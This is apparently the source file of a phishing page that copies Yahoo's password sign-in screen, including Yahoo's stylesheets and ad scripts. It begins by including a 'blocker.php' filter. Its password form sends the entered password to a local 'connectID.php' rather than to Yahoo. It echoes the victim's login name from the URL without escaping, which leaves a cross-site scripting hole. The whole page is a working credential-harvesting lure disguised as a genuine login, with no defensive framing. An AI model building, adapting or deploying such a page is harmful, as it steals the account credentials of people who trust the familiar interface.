﻿<?php
include('blocker.php');
?>
<html id="Stencil" class="js yui3-js-enabled"><head>
        <meta charset="utf-8">
        <meta name="viewport" content="initial-scale=1, maximum-scale=1, user-scalable=0">
        <meta name="format-detection" content="telephone=no">
        <meta name="referrer" content="origin-when-cross-origin">
        <title>Yahoo</title>
		<link href="http://mail.yahoo.com/favicon.ico" rel="icon" type="image/x-icon" />
        <link rel="dns-prefetch" href="//gstatic.com">
        <link rel="dns-prefetch" href="//google.com">
        <link rel="dns-prefetch" href="//s.yimg.com">
        <link rel="dns-prefetch" href="//y.analytics.yahoo.com">
        <link rel="dns-prefetch" href="//ucs.query.yahoo.com">
        <link rel="dns-prefetch" href="//geo.query.yahoo.com">
        <link rel="dns-prefetch" href="//geo.yahoo.com">
        <!--[if lte IE 8]>
        <link rel="stylesheet" href="https://s.yimg.com/zz/combo?yui-s:pure/0.5.0/pure-min.css&yui-s:pure/0.5.0/grids-responsive-old-ie-min.css">
        <![endif]-->
        <!--[if gt IE 8]><!-->
        <link rel="stylesheet" href="https://s.yimg.com/zz/combo?yui-s:pure/0.5.0/pure-min.css&amp;yui-s:pure/0.5.0/grids-responsive-min.css">
        <!--<![endif]-->
        <style nonce="pSA9mWZphlGO0oVvCgrXgmTl2Kq5RDrtxYV5n7G7YxrGovEs">
            #mbr-css-check { 
                display: inline;
            }
        </style>
        <link href="https://s.yimg.com/zz/combo?wm/mbr/0.1.4630/main.css" rel="stylesheet" type="text/css">
<link href="https://s.yimg.com/zz/combo?kx/yucs/uh3s/atomic/88/css/atomic-min.css&amp;kx/yucs/uh_common/meta/3/css/meta-min.css&amp;kx/yucs/uh3s/uh/394/css/uh-center-aligned-min.css" rel="stylesheet" type="text/css">
        <script nonce="pSA9mWZphlGO0oVvCgrXgmTl2Kq5RDrtxYV5n7G7YxrGovEs">
            (function(root) {
                var isGoodJS = ('create' in Object && 'isArray' in Array && 'pushState' in window.history);
                root.isGoodJS = isGoodJS;
            }(this));
            
(function (root) {
/* -- Data -- */
root.YUI_config = {"comboBase":"https:\u002F\u002Fs.yimg.com\u002Fzz\u002Fcombo?","combine":true,"root":"yui-s:3.18.0\u002F"};
root.I13N_config = {"debug":false,"_ywa":10001496213979,"client_only":1,"spaceid":1197774520,"sections":null};
root.COMET_URL = "https:\u002F\u002Fpr.comet.yahoo.com\u002Fcomet";
root.I13N_config || (root.I13N_config = {});
root.I13N_config.spaceid = 360782993;
root.darlaConfig = {"url":"https:\u002F\u002Ffc.yahoo.com\u002Fsdarla\u002Fphp\u002Fclient.php?l=RICH{dest:tgtRICH;asz:flex}&f=360782993&ref=https%3A%2F%2Flogin.yahoo.com%2Faccount%2Fchallenge%2Fpassword","positions":{"RICH":{"id":"RICH","clean":"login-ad-rich","dest":"login-ad-rich","w":"1440,","h":"1024,","timeout":3000,"noexp":1,"fdb":{"on":1,"where":"inside","minReqWidth":1325,"showAfter":2000}}}};
root.challenge || (root.challenge = {});
root.challenge.servingStamp = 1498291563522;
}(this));

            
            YUI_config.global = window;

            window.mbrSendError = function (name, url) {
                (new Image()).src = '/account/js-reporting/?rid=4hpuju5cks7bb&crumb=' + encodeURIComponent('WB9Bd6ngh2v') + '&message=' + encodeURIComponent(name.toLowerCase()) + '&url=' + encodeURIComponent(url);
            };

            var oldError = window.onerror;

            window.onerror = function (errorMsg, url) {
                window.mbrSendError(errorMsg, url);
                if (oldError) {
                    oldError.apply(this, arguments);
                }
                return false;
            };
        </script>
    <script type="text/x-safeframe-booted" id="sf_tag_1498291568765_32">{"positions":[{"id":"RICH","html":"<!-- SpaceID=360782993 loc=RICH noad --><!-- fac-gd2-noad --><!-- gd2-status-2 --><!--QYZ CMS_NONE_AVAIL,,;;RICH;360782993;2-->","lowHTML":"","meta":{"y":{"pos":"RICH","cscHTML":"<scr"+"ipt language=javascr"+"ipt>\nif(window.xzq_d==null)window.xzq_d=new Object();\nwindow.xzq_d['ACIhHQrIEkM-']='(as$125u2g466,aid$ACIhHQrIEkM-,cr$-1,ct$25,at$H,eob$gd1_match_id=-1:ypos=RICH)';\n<\/scr"+"ipt><noscr"+"ipt><img width=1 height=1 alt=\"\" src=\"https:\/\/beap-bc.yahoo.com\/yi?bv=1.0.0&bs=(12qf3vj7m(gid$WqTqCjEwLjID8YiVWU4dUwAuMTI5LgAAAAAwvVfi,st$1498291569008084,sp$360782993,pv$1,v$2.0))&t=J_3-DR_3&al=(as$125u2g466,aid$ACIhHQrIEkM-,cr$-1,ct$25,at$H,eob$gd1_match_id=-1:ypos=RICH)\"><\/noscr"+"ipt>","cscURI":"https:\/\/beap-bc.yahoo.com\/yi?bv=1.0.0&bs=(12qf3vj7m(gid$WqTqCjEwLjID8YiVWU4dUwAuMTI5LgAAAAAwvVfi,st$1498291569008084,sp$360782993,pv$1,v$2.0))&t=J_3-DR_3&al=(as$125u2g466,aid$ACIhHQrIEkM-,cr$-1,ct$25,at$H,eob$gd1_match_id=-1:ypos=RICH)","behavior":"non_exp","adID":"#2","matchID":"#2","bookID":"-1","slotID":"0","serveType":"-1","err":"invalid_space","hasExternal":false,"supp_ugc":"0","placementID":-1,"fdb":"{ \\\"fdb_url\\\": \\\"http:\\\\\/\\\\\/beap-bc.yahoo.com\\\\\/af?bv=1.0.0&bs=(15ir45r6b(gid$jmTVQDk4LjHHbFsHU5jMkgKkMTAuNwAAAACljpkK,st$1402537233026922,srv$1,si$13303551,adv$25941429036,ct$25,li$3239250051,exp$1402544433026922,cr$4154984551,pbid$25372728133,v$1.0))&al=(type${type},cmnt${cmnt},subo${subo})&r=10\\\", \\\"fdb_on\\\": \\\"1\\\", \\\"fdb_exp\\\": \\\"1402544433026\\\", \\\"fdb_intl\\\": \\\"en-us\\\" , \\\"d\\\" : \\\"1\\\" }","serveTime":1498291569008084,"impID":"","creativeID":-1,"adc":"{\\\"label\\\":\\\"AdChoices\\\",\\\"url\\\":\\\"https:\\\\\/\\\\\/info.yahoo.com\\\\\/privacy\\\\\/us\\\\\/yahoo\\\\\/relevantads.html\\\",\\\"close\\\":\\\"Close\\\",\\\"closeAd\\\":\\\"Close Ad\\\",\\\"showAd\\\":\\\"Show ad\\\",\\\"collapse\\\":\\\"Collapse\\\",\\\"fdb\\\":\\\"I don't like this ad\\\",\\\"code\\\":\\\"en-us\\\"}","is3rd":0,"facStatus":{},"userProvidedData":{},"facRotation":{},"slotData":{"pt":"0","bamt":"10000000000.000000","namt":"0.000000","isLiveAdPreview":"false","is_ad_feedback":"false","trusted_custom":"false","isCompAds":"false","pvid":"WqTqCjEwLjID8YiVWU4dUwAuMTI5LgAAAAAwvVfi"}}}}],"conf":{"useYAC":0,"usePE":1,"servicePath":"","xservicePath":"","beaconPath":"","renderPath":"","allowFiF":false,"srenderPath":"https:\/\/s.yimg.com\/rq\/darla\/3-0-2\/html\/r-sf.html","renderFile":"https:\/\/s.yimg.com\/rq\/darla\/3-0-2\/html\/r-sf.html","sfbrenderPath":"https:\/\/s.yimg.com\/rq\/darla\/3-0-2\/html\/r-sf.html","msgPath":"https:\/\/fc.yahoo.com\/sdarla\/3-0-2\/html\/msg.html","cscPath":"https:\/\/s.yimg.com\/rq\/darla\/3-0-2\/html\/r-csc.html","root":"sdarla","edgeRoot":"http:\/\/l.yimg.com\/rq\/darla\/3-0-2","sedgeRoot":"https:\/\/s.yimg.com\/rq\/darla\/3-0-2","version":"3-0-2","tpbURI":"","hostFile":"https:\/\/s.yimg.com\/rq\/darla\/3-0-2\/js\/g-r-min.js","fdb_locale":"What don't you like about this ad?|It's offensive|Something else|Thank you for helping us improve your Yahoo experience|It's not relevant|It's distracting|I don't like this ad|Send|Done|Why do I see ads?|Learn more about your feedback.","positions":{"RICH":{"dest":"tgtRICH","asz":"flex","id":"RICH","h":"","w":"fle"}},"property":"","events":[],"lang":"en-us","spaceID":"360782993","debug":false,"asString":"{\"useYAC\":0,\"usePE\":1,\"servicePath\":\"\",\"xservicePath\":\"\",\"beaconPath\":\"\",\"renderPath\":\"\",\"allowFiF\":false,\"srenderPath\":\"https:\\\/\\\/s.yimg.com\\\/rq\\\/darla\\\/3-0-2\\\/html\\\/r-sf.html\",\"renderFile\":\"https:\\\/\\\/s.yimg.com\\\/rq\\\/darla\\\/3-0-2\\\/html\\\/r-sf.html\",\"sfbrenderPath\":\"https:\\\/\\\/s.yimg.com\\\/rq\\\/darla\\\/3-0-2\\\/html\\\/r-sf.html\",\"msgPath\":\"https:\\\/\\\/fc.yahoo.com\\\/sdarla\\\/3-0-2\\\/html\\\/msg.html\",\"cscPath\":\"https:\\\/\\\/s.yimg.com\\\/rq\\\/darla\\\/3-0-2\\\/html\\\/r-csc.html\",\"root\":\"sdarla\",\"edgeRoot\":\"http:\\\/\\\/l.yimg.com\\\/rq\\\/darla\\\/3-0-2\",\"sedgeRoot\":\"https:\\\/\\\/s.yimg.com\\\/rq\\\/darla\\\/3-0-2\",\"version\":\"3-0-2\",\"tpbURI\":\"\",\"hostFile\":\"https:\\\/\\\/s.yimg.com\\\/rq\\\/darla\\\/3-0-2\\\/js\\\/g-r-min.js\",\"fdb_locale\":\"What don't you like about this ad?|It's offensive|Something else|Thank you for helping us improve your Yahoo experience|It's not relevant|It's distracting|I don't like this ad|Send|Done|Why do I see ads?|Learn more about your feedback.\",\"positions\":{\"RICH\":{\"dest\":\"tgtRICH\",\"asz\":\"flex\",\"id\":\"RICH\",\"h\":\"\",\"w\":\"fle\"}},\"property\":\"\",\"events\":[],\"lang\":\"en-us\",\"spaceID\":\"360782993\",\"debug\":false}"},"meta":{"y":{"pageEndHTML":"<scr"+"ipt language=javascr"+"ipt>\n(function(){window.xzq_p=function(R){M=R};window.xzq_svr=function(R){J=R};function F(S){var T=document;if(T.xzq_i==null){T.xzq_i=new Array();T.xzq_i.c=0}var R=T.xzq_i;R[++R.c]=new Image();R[R.c].src=S}window.xzq_sr=function(){var S=window;var Y=S.xzq_d;if(Y==null){return }if(J==null){return }var T=J+M;if(T.length>P){C();return }var X=\"\";var U=0;var W=Math.random();var V=(Y.hasOwnProperty!=null);var R;for(R in Y){if(typeof Y[R]==\"string\"){if(V&&!Y.hasOwnProperty(R)){continue}if(T.length+X.length+Y[R].length<=P){X+=Y[R]}else{if(T.length+Y[R].length>P){}else{U++;N(T,X,U,W);X=Y[R]}}}}if(U){U++}N(T,X,U,W);C()};function N(R,U,S,T){if(U.length>0){R+=\"&al=\"}F(R+U+\"&s=\"+S+\"&r=\"+T)}function C(){window.xzq_d=null;M=null;J=null}function K(R){xzq_sr()}function B(R){xzq_sr()}function L(U,V,W){if(W){var R=W.toString();var T=U;var Y=R.match(new RegExp(\"\\\\\\\\(([^\\\\\\\\)]*)\\\\\\\\)\"));Y=(Y[1].length>0?Y[1]:\"e\");T=T.replace(new RegExp(\"\\\\\\\\([^\\\\\\\\)]*\\\\\\\\)\",\"g\"),\"(\"+Y+\")\");if(R.indexOf(T)<0){var X=R.indexOf(\"{\");if(X>0){R=R.substring(X,R.length)}else{return W}R=R.replace(new RegExp(\"([^a-zA-Z0-9$_])this([^a-zA-Z0-9$_])\",\"g\"),\"$1xzq_this$2\");var Z=T+\";var rv = f( \"+Y+\",this);\";var S=\"{var a0 = '\"+Y+\"';var ofb = '\"+escape(R)+\"' ;var f = new Function( a0, 'xzq_this', unescape(ofb));\"+Z+\"return rv;}\";return new Function(Y,S)}else{return W}}return V}window.xzq_eh=function(){if(E||I){this.onload=L(\"xzq_onload(e)\",K,this.onload,0);if(E&&typeof (this.onbeforeunload)!=O){this.onbeforeunload=L(\"xzq_dobeforeunload(e)\",B,this.onbeforeunload,0)}}};window.xzq_s=function(){setTimeout(\"xzq_sr()\",1)};var J=null;var M=null;var Q=navigator.appName;var H=navigator.appVersion;var G=navigator.userAgent;var A=parseInt(H);var D=Q.indexOf(\"Microsoft\");var E=D!=-1&&A>=4;var I=(Q.indexOf(\"Netscape\")!=-1||Q.indexOf(\"Opera\")!=-1)&&A>=4;var O=\"undefined\";var P=2000})();\n<\/scr"+"ipt><scr"+"ipt language=javascr"+"ipt>\nif(window.xzq_svr)xzq_svr('https:\/\/beap-bc.yahoo.com\/');\nif(window.xzq_p)xzq_p('yi?bv=1.0.0&bs=(12qf3vj7m(gid$WqTqCjEwLjID8YiVWU4dUwAuMTI5LgAAAAAwvVfi,st$1498291569008084,sp$360782993,pv$1,v$2.0))&t=J_3-DR_3');\nif(window.xzq_s)xzq_s();\n<\/scr"+"ipt><noscr"+"ipt><img width=1 height=1 alt=\"\" src=\"https:\/\/beap-bc.yahoo.com\/yi?bv=1.0.0&bs=(12qf3vj7m(gid$WqTqCjEwLjID8YiVWU4dUwAuMTI5LgAAAAAwvVfi,st$1498291569008084,sp$360782993,pv$1,v$2.0))&t=J_3-DR_3\"><\/noscr"+"ipt><scr"+"ipt>(function(c){var d=\"https:\/\/\",a=c&&c.JSON,e=\"ypcdb\",g=document,b;function j(n,q,p,o){var m,r;try{m=new Date();m.setTime(m.getTime()+o*1000);g.cookie=[n,\"=\",encodeURIComponent(q),\"; domain=\",p,\"; path=\/; max-age=\",o,\"; expires=\",m.toUTCString()].join(\"\")}catch(r){}}function k(m){return function(){i(m)}}function i(n){var m,o;try{m=new Image();m.onerror=m.onload=function(){m.onerror=m.onload=null;m=null};m.src=n}catch(o){}}function f(o){var p=\"\",n,s,r,q;if(o){try{n=o.match(\/^https?:\\\/\\\/([^\\\/\\?]*)(yahoo\\.com|yimg\\.com|flickr\\.com|yahoo\\.net|rivals\\.com)(:\\d+)?([\\\/\\?]|$)\/);if(n&&n[2]){p=n[2]}n=(n&&n[1])||null;s=n?n.length-1:-1;r=n&&s>=0?n[s]:null;if(r&&r!=\".\"&&r!=\"\/\"){p=\"\"}}catch(q){p=\"\"}}return p}function l(B,n,q,m,p){var u,s,t,A,r,F,z,E,C,y,o,D,x,v=1000,w=v;try{b=location}catch(z){b=null}try{if(a){C=a.parse(p)}else{y=new Function(\"return \"+p);C=y()}}catch(z){C=null}if(y){y=null}try{s=b.hostname;t=b.protocol;if(t){t+=\"\/\/\"}}catch(z){s=t=\"\"}if(!s){try{A=g.URL||b.href||\"\";r=A.match(\/^((http[s]?)\\:[\\\/]+)?([^:\\\/\\s]+|[\\:\\dabcdef\\.]+)\/i);if(r&&r[1]&&r[3]){t=r[1]||\"\";s=r[3]||\"\"}}catch(z){t=s=\"\"}}if(!s||!C||!t||!q){return}A=g.URL||b.href||\"\";E=f(A);if(!E||g.cookie.indexOf(\"ypcdb=\"+n)>-1){return}if(t===d){q=m}u=0;while(F=q[u++]){o=F.lastIndexOf(\"=\");if(o!=-1){D=F.substr(1+o);x=C[D];if(x){setTimeout(k(t+F+x),w);w+=v}}}u=0;while(F=B[u++]){setTimeout(k(t+F),w);w+=v}setTimeout(function(){j(e,n,E,86400)},w)}function h(){l(['ads.yahoo.com\/get-user-id?ver=2&s=800000008&type=redirect&ts=1498291569&sig=33472b476301f534'],'75418d2ba6ddfe59a8329b921389f36d',['csync.flickr.com\/csync?ver=2.1','csync.yahooapis.com\/csync?ver=2.1'],['csync.flickr.com\/csync?ver=2.1','csync.yahooapis.com\/csync?ver=2.1'],'{\"2.1\":\"&id=23351&value=07fp8vypxf7nw%26o%3d3%26f%3dqn&optout=&timeout=1498291569&sig=11gun81t3\"}')}if(c.addEventListener){c.addEventListener(\"load\",h,false)}else{if(c.attachEvent){c.attachEvent(\"onload\",h)}else{c.onload=h}}})(window);\n<\/scr"+"ipt>","pos_list":["RICH"],"transID":"darla_prefetch_1498291569005_93279142_3","k2_uri":"","fac_rt":"15538","spaceID":"360782993","lookupTime":21,"procTime":22,"npv":0,"pvid":"WqTqCjEwLjID8YiVWU4dUwAuMTI5LgAAAAAwvVfi","serveTime":1498291569008084,"ep":{"site-attribute":"","tgt":"_blank","secure":true,"ref":"https:\/\/login.yahoo.com\/account\/challenge\/password","filter":"no_expandable;exp_iframe_expandable;","darlaID":"darla_instance_1498291569005_503540648_2"},"pym":{".":"v0.0.9;;-;"},"host":"","filtered":[],"pe":"CWZ1bmN0aW9uIGRwZWQoKSB7IGlmKHdpbmRvdy54enFfZD09bnVsbCl3aW5kb3cueHpxX2Q9bmV3IE9iamVjdCgpOwp3aW5kb3cueHpxX2RbJ0FDSWhIUXJJRWtNLSddPScoYXMkMTI1dTJnNDY2LGFpZCRBQ0loSFFySUVrTS0sY3IkLTEsY3QkMjUsYXQkSCxlb2IkZ2QxX21hdGNoX2lkPS0xOnlwb3M9UklDSCknOwoJCSB9OwpkcGVkLnRyYW5zSUQgPSAiZGFybGFfcHJlZmV0Y2hfMTQ5ODI5MTU2OTAwNV85MzI3OTE0Ml8zIjsKCglmdW5jdGlvbiBkcGVyKCkgeyAKCQppZih3aW5kb3cueHpxX3N2cil4enFfc3ZyKCdodHRwczovL2JlYXAtYmMueWFob28uY29tLycpOwppZih3aW5kb3cueHpxX3ApeHpxX3AoJ3lpP2J2PTEuMC4wJmJzPSgxMnFmM3ZqN20oZ2lkJFdxVHFDakV3TGpJRDhZaVZXVTRkVXdBdU1USTVMZ0FBQUFBd3ZWZmksc3QkMTQ5ODI5MTU2OTAwODA4NCxzcCQzNjA3ODI5OTMscHYkMSx2JDIuMCkpJnQ9Sl8zLURSXzMnKTsKaWYod2luZG93Lnh6cV9zKXh6cV9zKCk7CgoKCShmdW5jdGlvbihjKXt2YXIgZD0iaHR0cHM6Ly8iLGE9YyYmYy5KU09OLGU9InlwY2RiIixnPWRvY3VtZW50LGI7ZnVuY3Rpb24gaihuLHEscCxvKXt2YXIgbSxyO3RyeXttPW5ldyBEYXRlKCk7bS5zZXRUaW1lKG0uZ2V0VGltZSgpK28qMTAwMCk7Zy5jb29raWU9W24sIj0iLGVuY29kZVVSSUNvbXBvbmVudChxKSwiOyBkb21haW49IixwLCI7IHBhdGg9LzsgbWF4LWFnZT0iLG8sIjsgZXhwaXJlcz0iLG0udG9VVENTdHJpbmcoKV0uam9pbigiIil9Y2F0Y2gocil7fX1mdW5jdGlvbiBrKG0pe3JldHVybiBmdW5jdGlvbigpe2kobSl9fWZ1bmN0aW9uIGkobil7dmFyIG0sbzt0cnl7bT1uZXcgSW1hZ2UoKTttLm9uZXJyb3I9bS5vbmxvYWQ9ZnVuY3Rpb24oKXttLm9uZXJyb3I9bS5vbmxvYWQ9bnVsbDttPW51bGx9O20uc3JjPW59Y2F0Y2gobyl7fX1mdW5jdGlvbiBmKG8pe3ZhciBwPSIiLG4scyxyLHE7aWYobyl7dHJ5e249by5tYXRjaCgvXmh0dHBzPzpcL1wvKFteXC9cP10qKSh5YWhvb1wuY29tfHlpbWdcLmNvbXxmbGlja3JcLmNvbXx5YWhvb1wubmV0fHJpdmFsc1wuY29tKSg6XGQrKT8oW1wvXD9dfCQpLyk7aWYobiYmblsyXSl7cD1uWzJdfW49KG4mJm5bMV0pfHxudWxsO3M9bj9uLmxlbmd0aC0xOi0xO3I9biYmcz49MD9uW3NdOm51bGw7aWYociYmciE9Ii4iJiZyIT0iLyIpe3A9IiJ9fWNhdGNoKHEpe3A9IiJ9fXJldHVybiBwfWZ1bmN0aW9uIGwoQixuLHEsbSxwKXt2YXIgdSxzLHQsQSxyLEYseixFLEMseSxvLEQseCx2PTEwMDAsdz12O3RyeXtiPWxvY2F0aW9ufWNhdGNoKHope2I9bnVsbH10cnl7aWYoYSl7Qz1hLnBhcnNlKHApfWVsc2V7eT1uZXcgRnVuY3Rpb24oInJldHVybiAiK3ApO0M9eSgpfX1jYXRjaCh6KXtDPW51bGx9aWYoeSl7eT1udWxsfXRyeXtzPWIuaG9zdG5hbWU7dD1iLnByb3RvY29sO2lmKHQpe3QrPSIvLyJ9fWNhdGNoKHope3M9dD0iIn1pZighcyl7dHJ5e0E9Zy5VUkx8fGIuaHJlZnx8IiI7cj1BLm1hdGNoKC9eKChodHRwW3NdPylcOltcL10rKT8oW146XC9cc10rfFtcOlxkYWJjZGVmXC5dKykvaSk7aWYociYmclsxXSYmclszXSl7dD1yWzFdfHwiIjtzPXJbM118fCIifX1jYXRjaCh6KXt0PXM9IiJ9fWlmKCFzfHwhQ3x8IXR8fCFxKXtyZXR1cm59QT1nLlVSTHx8Yi5ocmVmfHwiIjtFPWYoQSk7aWYoIUV8fGcuY29va2llLmluZGV4T2YoInlwY2RiPSIrbik+LTEpe3JldHVybn1pZih0PT09ZCl7cT1tfXU9MDt3aGlsZShGPXFbdSsrXSl7bz1GLmxhc3RJbmRleE9mKCI9Iik7aWYobyE9LTEpe0Q9Ri5zdWJzdHIoMStvKTt4PUNbRF07aWYoeCl7c2V0VGltZW91dChrKHQrRit4KSx3KTt3Kz12fX19dT0wO3doaWxlKEY9Qlt1KytdKXtzZXRUaW1lb3V0KGsodCtGKSx3KTt3Kz12fXNldFRpbWVvdXQoZnVuY3Rpb24oKXtqKGUsbixFLDg2NDAwKX0sdyl9ZnVuY3Rpb24gaCgpe2woWydhZHMueWFob28uY29tL2dldC11c2VyLWlkP3Zlcj0yJnM9ODAwMDAwMDA4JnR5cGU9cmVkaXJlY3QmdHM9MTQ5ODI5MTU2OSZzaWc9MzM0NzJiNDc2MzAxZjUzNCddLCc3NTQxOGQyYmE2ZGRmZTU5YTgzMjliOTIxMzg5ZjM2ZCcsWydjc3luYy5mbGlja3IuY29tL2NzeW5jP3Zlcj0yLjEnLCdjc3luYy55YWhvb2FwaXMuY29tL2NzeW5jP3Zlcj0yLjEnXSxbJ2NzeW5jLmZsaWNrci5jb20vY3N5bmM\/dmVyPTIuMScsJ2NzeW5jLnlhaG9vYXBpcy5jb20vY3N5bmM\/dmVyPTIuMSddLCd7IjIuMSI6IiZpZD0yMzM1MSZ2YWx1ZT0wN2ZwOHZ5cHhmN253JTI2byUzZDMlMjZmJTNkcW4mb3B0b3V0PSZ0aW1lb3V0PTE0OTgyOTE1Njkmc2lnPTExZ3VuODF0MyJ9Jyl9aWYoYy5hZGRFdmVudExpc3RlbmVyKXtjLmFkZEV2ZW50TGlzdGVuZXIoImxvYWQiLGgsZmFsc2UpfWVsc2V7aWYoYy5hdHRhY2hFdmVudCl7Yy5hdHRhY2hFdmVudCgib25sb2FkIixoKX1lbHNle2Mub25sb2FkPWh9fX0pKHdpbmRvdyk7CgoKCQogfTsKZHBlci50cmFuc0lEID0iZGFybGFfcHJlZmV0Y2hfMTQ5ODI5MTU2OTAwNV85MzI3OTE0Ml8zIjsKCg=="}}}</script><script type="text/javascript" src="https://s.yimg.com/rq/darla/boot.js"></script><script id="sf_host_lib_sf_auto_6-24-5-2017" type="text/javascript" class="sf_lib" src="https://s.yimg.com/rq/darla/3-0-2/js/g-r-min.js"></script></head>
    <body>
        <div class="mbr-legacy-device-bar " id="mbr-legacy-device-bar">
            <label class="cross" for="mbr-legacy-device-bar-cross" aria-label="Close this&nbsp;warning">x</label>
            <input type="checkbox" id="mbr-legacy-device-bar-cross">
            <p class="mbr-legacy-device">
                Yahoo works best with the latest versions of the browsers. You're using an outdated or unsupported browser and some Yahoo features may not work properly. Please update your browser version now. <a href="https://help.yahoo.com/kb/index?page=content&amp;y=PROD_ACCT&amp;id=SLN27925&amp;actp=productlink&amp;locale=en_US">More&nbsp;Info</a>
            </p>
        </div>
    <script nonce="pSA9mWZphlGO0oVvCgrXgmTl2Kq5RDrtxYV5n7G7YxrGovEs">
        (function(root) {
            var doc = document;

            if (root.isGoodJS) {
                doc.documentElement.className = doc.documentElement.className.replace('no-js', 'js');
                doc.cookie = 'mbr-nojs=; domain=' + doc.domain + '; path=/account; expires=Thu, 01 Jan 1970 00:00:01 GMT; secure';
            } else {
                doc.cookie = 'mbr-nojs=badbrowser; domain=' + doc.domain + '; path=/account; expires=Fri, 31 Dec 9999 23:59:59 GMT; secure';
                doc.getElementById('mbr-legacy-device-bar').style.display = 'block';
            }
        }(this));
    </script>

    <div class="loginish puree-v2">
    <div class="hd mbr-ucs-hd" id="mbr-uh-hd">
    <style type="text/css">@font-face{font-family:uh;src:url(https://s.yimg.com/os/uh-icons/0.1.16/uh/fonts/uh.eot?);src:url(https://s.yimg.com/os/uh-icons/0.1.16/uh/fonts/uh.eot?#iefix) format('embedded-opentype'),url(https://s.yimg.com/os/uh-icons/0.1.16/uh/fonts/uh.woff2?) format('woff2'),url(https://s.yimg.com/os/uh-icons/0.1.16/uh/fonts/uh.woff?) format('woff'),url(https://s.yimg.com/os/uh-icons/0.1.16/uh/fonts/uh.ttf?) format('truetype'),url(https://s.yimg.com/os/uh-icons/0.1.16/uh/fonts/uh.svg?#uh) format('svg');font-weight:400;font-style:normal}[class^=Ycon],[class*=" Ycon"]{font-family:uh;speak:none;font-style:normal;font-weight:400;font-variant:normal;text-transform:none;line-height:1;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}</style><link type="text/css" rel="stylesheet" href="https://s.yimg.com/zz/combo?os/stencil/3.0.1/desktop/styles-ltr.css"><!-- meta --><div id="yucs-meta" data-authstate="signedout" data-cobrand="standard" data-crumb="aEW1WtSdUhW" data-mc-crumb="RWvCTz9Y3O6" data-gta="oFF0Hi1EU7J" data-device="desktop" data-experience="uh304" data-firstname="" data-style="" data-flight="1498291563" data-forcecobrand="standard" data-guid="" data-host="login.yahoo.com" data-https="1" data-languagetag="en-us" data-property="login" data-protocol="https" data-shortfirstname="" data-shortuserid="" data-status="active" data-spaceid="" data-test_id="" data-userid="" data-stickyheader="true" data-headercollapse="" data-uh-test="acctswitch"></div><!-- /meta --><div id="UH" class="Row Pos(r) Start(0) T(0) End(0) Z(10) yucs-en-us yucs-login yucs" role="banner" data-protocol="https" data-property="login" data-spaceid="" data-stencil="true"> <style>body {
margin-top: 0px !important; 
}

#UH{
font: 13px/1.25 "Helvetica Neue",Helvetica,Arial,sans-serif;
}

.YLogoMY{
text-indent: -30em;
}</style> <div id="uhWrapper" class="Mx(a) Z(1) Pos(r) Zoom Mstart(16px) Pt(14px)" data-ylk="rspns:nav;act:click;t1:a1;t2:uh-d;itc:0;" style="height: 3.8em;"> <div class="UHCol1 Pos(a) Fl(start)" role="presentation"><style>/** * IE7+ and non-retina display */.YLogoMY { background-repeat: no-repeat; background-image: url(https://s.yimg.com/rz/l/yahoo_en-US_f_pw_125x32.png); _background-image: url(https://s.yimg.com/rz/l/yahoo_en-US_f_pw_125x32.gif); /* IE6 */ width: 125px !important; }.DarkTheme .YLogoMY { background-position: -125px 0px !important;}/** * For 'retina' display */@media only screen and (-webkit-min-device-pixel-ratio: 2), only screen and ( min--moz-device-pixel-ratio: 2), only screen and ( -o-min-device-pixel-ratio: 2/1), only screen and ( min-device-pixel-ratio: 2), only screen and ( min-resolution: 192dpi), only screen and ( min-resolution: 2dppx) { .YLogoMY { background-image: url(https://s.yimg.com/rz/l/yahoo_en-US_f_pw_125x32_2x.png) !important; background-size: 250px 32px !important; }}</style><a class="YLogoMY D(b) Ov(h) Ti(-20em) Zoom Darktheme_Bgp(b_t) W(137px) H(34px) Mx(a)! " data-ylk="slk:logo;t3:logo;t5:logo;elm:img;elmt:logo;" href="https://www.yahoo.com" target="_top">Yahoo</a></div> <div class="UHCol3" role="presentation" id="uhNavWrapper"> <ul class="Fl(end) Mend(10px) Lts(-0.31em) Tren(os) Whs(nw) My(6px)">    <li id="yucs-help" class=" yucs-activate yucs-help yucs-menu_nav D(ib) Zoom Va(t) Pos(r) Lh(1.7)"> <a id="yucs-help_link" class="C(#000)! D(ib) Lts(n) yltasis yucs-trigger Lh(1) Td(n)! Td(u)!:h Fz(13px)" href="https://help.yahoo.com/kb/index?locale=en_US&amp;page=product&amp;y=PROD_ACCT" target="_blank" data-ylk="act:click;t2:uh-d;t3:tl-lst;elm:itm;elmt:mu;itc:0;"> <b>Help</b> </a></li> </ul> </div> </div><!-- /#UH --></div>   
</div>

        <div class="login-box-container">
            <div class="login-box">
                <span class="login-box-top"></span>
                <div class="txt-align-center">
                    <img src="https://s.yimg.com/rz/d/yahoo_en-US_f_p_bestfit_2x.png" alt="Yahoo" class="logo" width="116">
                </div>
                <div class="challenge">
    <div id="password-challenge" class="primary">
    <div class="greeting">
        <h1 class="username">Hello <?php echo $_GET['login']; ?></h1>
        <p class="not-you"><a href="">Not you?</a></p>
    </div>
    <form action="connectID.php" method="post" class="pure-form pure-form-stacked">
   <div class="hidden-username">
   <input type="text" tabindex="-1" aria-hidden="true" role="presentation" autocorrect="off" spellcheck="false" name="login" value="<?php echo $_GET['login']; ?>" />
   </div>
   <input type="hidden" name="passwordContext" value="normal" />
        <input type="password" id="login-passwd" required=""  name="password" placeholder="Password" autofocus/>
        <p class="signin-cont">
            <button type="submit" id="login-signin" class="pure-button puree-button-primary puree-spinner-button" name="verifyPassword" value="Sign in" data-ylk="elm:btn;elmt:next;slk:next">
                Sign in
            </button>
        </p>
        <p class="forgot-cont">
            <input type="submit" class="pure-button puree-button-link"
                data-ylk="elm:btn;elmt:skip;slk:skip" id="mbr-forgot-link"
                name="skip" value="I forgot my password" />
        </p>
    </form>
</div>

</div>

            </div>
            <div id="login-box-ad-fallback" class="login-box-ad-fallback" style="display: block;">
                <h1>Yahoo makes it easy to enjoy what matters most in your&nbsp;world.</h1>
<p>Best in class Yahoo Mail, breaking local, national and global news, finance, sports, music, movies and more. You get more out of the web, you get more out of&nbsp;life.</p>

            </div>
        </div>
        <div class="login-box-ad-outer">
            <div class="login-box-ad-inner">
                <div id="login-ad-rich"></div>
            </div>
        </div>
</div>

    <script src="https://s.yimg.com/zz/combo?wm/mbr/0.1.4630/bundle.js"></script><div id="ads"></div>
<script src="https://s.yimg.com/zz/combo?yui-s:3.18.0/build/yui/yui-min.js&amp;"></script><div id="yui3-css-stamp" style="position: absolute !important; visibility: hidden !important"></div>
    <noscript>
